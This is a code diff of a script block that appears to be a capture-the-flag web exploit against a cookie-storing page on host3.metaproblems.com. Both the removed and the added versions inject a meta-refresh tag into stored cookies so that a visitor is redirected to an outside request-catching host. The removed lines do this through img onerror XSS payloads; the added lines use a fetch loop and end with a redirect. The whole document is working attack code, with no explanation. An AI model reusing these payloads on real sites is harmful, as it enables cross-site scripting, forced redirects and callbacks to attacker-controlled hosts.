@@ -6,13 +6,53 @@
 
 <script>
 
-let url = 'a=<meta ; http-equiv="refresh" ; content="0;url=https://webhook.site/2481a303-d4fb-4f97-aee5-013acc6c16f6">';
+async function makePostRequest(url, data) {
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            },
+            body: `cookie_name=${data.cookie_name}&cookie_value=${encodeURIComponent(data.cookie_value)}&submit=Store+Cookie`
+        });
+        return await response.json();
+    } catch (error) {
+        console.error('Error making POST request:', error);
+        throw error; 
+    }
+}
 
-<img src="x" onerror="fetch('http://host3.metaproblems.com:6020/index.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie_name=5&cookie_value=' + encodeURIComponent(url) + '&submit=Store+Cookie'});">
-<img src="x" onerror="fetch('http://host3.metaproblems.com:6020/index.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie_name=6&cookie_value=' + encodeURIComponent(url) + '&submit=Store+Cookie'});">
-<img src="x" onerror="fetch('http://host3.metaproblems.com:6020/index.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie_name=7&cookie_value=' + encodeURIComponent(url) + '&submit=Store+Cookie'});">
-<img src="x" onerror="fetch('http://host3.metaproblems.com:6020/index.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie_name=8&cookie_value=' + encodeURIComponent(url) + '&submit=Store+Cookie'});">
+async function setCookiesAndRedirect() {
+    const metaCookiesParts = [
+        'a=<meta',
+        'http-equiv="refresh"',
+        'content="0;',
+        'url=https://hi.requestcatcher.com/">'
+    ];
 
+    const url = 'http://host3.metaproblems.com:6020/index.php';
+    const numRequests = 4;
+    const requests = [];
+
+    for (let i = 0; i < numRequests; i++) {
+        const data = {
+            cookie_name: `cookie_${i + 1}`,
+            cookie_value: metaCookiesParts.join(' ')
+        };
+        requests.push(makePostRequest(url, data));
+    }
+
+    try {
+        const responses = await Promise.all(requests);
+        responses.forEach((response, index) => {
+            console.log(`Cookie ${index + 1} set:`, response);
+        });
+
+        window.location.href = 'view_cookie_url';
+    } catch (error) {
+        console.error('Error setting cookies:', error);
+    }
+}
 
 </script>
 
